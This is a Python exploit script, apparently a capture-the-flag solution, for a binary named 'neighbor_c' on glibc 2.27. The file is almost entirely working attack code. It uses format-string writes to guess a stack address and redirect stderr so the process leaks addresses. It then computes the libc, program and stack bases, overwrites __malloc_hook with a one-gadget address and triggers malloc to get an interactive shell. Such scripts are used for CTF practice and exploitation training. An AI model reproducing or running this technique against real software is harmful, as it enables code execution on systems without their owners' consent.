# File: exp.py
# Author: raycp
# Date: 2019-06-10
# Description: exp for neighbor_c, bruteforce to guess stack addr and stdout addt by 4bytes, and change stderr.fileno to 1, which then can leak address. then write one gadget to malloc_hook, at last trigger malloc

from pwn_debug import *


pdbg=pwn_debug("./neighbor_c")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def format_one(payload):
    p.sendline(payload)

def pwn():
    
    pdbg.bp([0x921])
    payload="a"*0x10
    format_one(payload)

    guess_stack=int(raw_input("stack target: "),16)
    
    # step1 guess stack address by 4 bytes
    addr=guess_stack&0xff
    payload="%%%dc%%%d$hhn"%(addr,7)
    format_one(payload)
    raw_input(">")
    # step2 guess stderr fileno field address by 4 bytes
    stderr_fileno=membp.libc_base+libc.symbols['_IO_2_1_stderr_']+14*8
    addr=stderr_fileno&0xffff
    payload="%%%dc%%%d$hn"%(addr,11)
    format_one(payload)
    raw_input(">")
    # step3 change stderr fileno from 2 to 1 
    payload="%%%dc%%%d$hhn"%(1,5)
    format_one(payload)
    raw_input(">")
    # step4 use stderr to leak address
    payload="**%6$p**%7$p**%10$p**"
    format_one(payload)
    print p.recvuntil("**")
    libc_base=int(p.recvuntil("**")[:-2],16)-libc.symbols['_IO_2_1_stderr_']
    stack_addr=int(p.recvuntil("**")[:-2],16)
    pro_base=int(p.recvuntil("**")[:-2],16)-0x962
    log.info("leak libc base: 0x%x"%(libc_base))
    log.info("leak pro base: 0x%x"%(pro_base))
    log.info("leak stack addr: 0x%x"%(stack_addr))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    rce=libc_base+0x41666 

    # step5 write one gadget to malloc_hook
    fmt_write={}
    fmt_write[malloc_hook]=rce&0xffff
    fmt_write[malloc_hook+2]=(rce>>16)&0xffff
    fmt_write[malloc_hook+4]=(rce>>32)&0xffff

    for where, what in fmt_write.items():
        addr=where&0xffff
        payload="%%%dc%%%d$hn"%(addr,11)
        format_one(payload)
        payload="%%%dc%%%d$hn"%(what,5)
        format_one(payload)
    # step6 trigger malloc
    payload="%65535c"
    format_one(payload)
    p.interactive()


if __name__ == '__main__':
    pwn()


